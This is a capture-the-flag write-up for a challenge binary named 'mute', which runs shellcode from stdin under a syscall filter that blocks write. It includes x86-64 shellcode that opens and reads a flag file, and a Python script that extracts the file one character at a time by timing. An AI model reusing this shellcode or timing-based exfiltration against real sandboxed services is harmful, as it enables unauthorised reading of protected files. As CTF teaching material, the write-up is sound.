# Writeup
The challenge gives the mute executable and that's all.
Doing a reverse engineer with IDA, we note two things:

1- There is a function dropSyscalls with drop every syscalls, except 0x0, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc and 0x3b. 
This means that the syscall 0x1 (write) is forbiden and we can not write to stdout.

![mute2](https://cloud.githubusercontent.com/assets/1280700/25589772/45f41628-2e84-11e7-98f7-7d6f808be792.png)

2- The executable just reads some bytes from stdin (lines 15-20) and executs it (line 21).

![mute1](https://cloud.githubusercontent.com/assets/1280700/25589768/42ff307e-2e84-11e7-81ac-f932461b2bd7.png)

After seeing that, the first thing that comes to my mind was to send a shellcode with reads the flag 
(I assumed it was in /home/mute/flag) and do a time-based blind attack. It tries to guess a character position of the flag. If
it is correct, them take some time (looping) before exiting. If it is incorrect, it just exits imediatelly. Actually, the exit
syscall is forbidden, but it does not metter because we are only interested in the timing.

```assembly
section .text
    global _start

_start:
;/home/mute/flag
mov r8, 0x67616c662f6574
push r8
mov r8, 0x756d2f656d6f682f
push r8

; syscall open file
mov rdi, rsp ; pop path value
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
cmp byte [rsi + 1], 0x69
jne exit

;guessed correct? sleep
mov ecx,0
loop1:

inc ecx
cmp ecx, 0xffffffff
jne loop1

mov ecx,0
loop2:

inc ecx
cmp ecx, 0xffffffff
jne loop2

; syscall exit
exit:
xor rax, rax
add al, 60
syscall
```

Taking the bytes of this shellcode, I made a python script to do this blind attack. the script sends the same bytes of 
the shellcode above, but replacing the corresponding guessing position and character (cmp byte [rsi + 1], 0x69).
```python
from pwn import *
import string
from datetime import datetime
import os

context.log_level = 'error'

shell = "\\x49\\xb8\\x74\\x65\\x2f\\x66\\x6c\\x61\\x67\\x00\\x41\\x50\\x49\\xb8\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x6d\\x75\\x41\\x50\\x48\\x89\\xe7\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x80\\x7e\\x01\\x68\\x75\\x18\\xb9\\x00\\x00\\x00\\x00\\xff\\xc1\\x83\\xf9\\xff\\x75\\xf9\\xb9\\x00\\x00\\x00\\x00\\xff\\xc1\\x83\\xf9\\xff\\x75\\xf9\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05"

flag = ""
i = 1

while True:
    for c in string.printable:
        try:
            current_shell = shell.replace("\\x01\\x68", "\\x" + chr(i).encode("hex") + "\\x" + c.encode("hex"))
            start = datetime.now()
            os.popen("python -c 'print(\"" + current_shell + "\" + \"\\x00\"*4009)' | ./mute") # nc mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443
            total = (datetime.now() - start).seconds
            if total >= 2:
                i += 1
                flag += c
                print("FOUND!!!!!")
                print(flag)
        except:
            pass
```

Locally it worked fine! Now it was time to try remotely. However, it was missing just about 10 minutes for the end of the competition.
Although I did not submit the flag in time, I consider that I solved this challenge. I took a look at this challenge just 2 
hours before the end of the competition and when I was with about half of the flag, the time went over and the server cames 
down :(
**The flag is: I tXXXXXXXXat 6qd do was, I'd DXXXXXX**

where **X** are the missing characters. It may have some wrong characters because of wrong estimation of time, but nothing that a 
double check could solve.

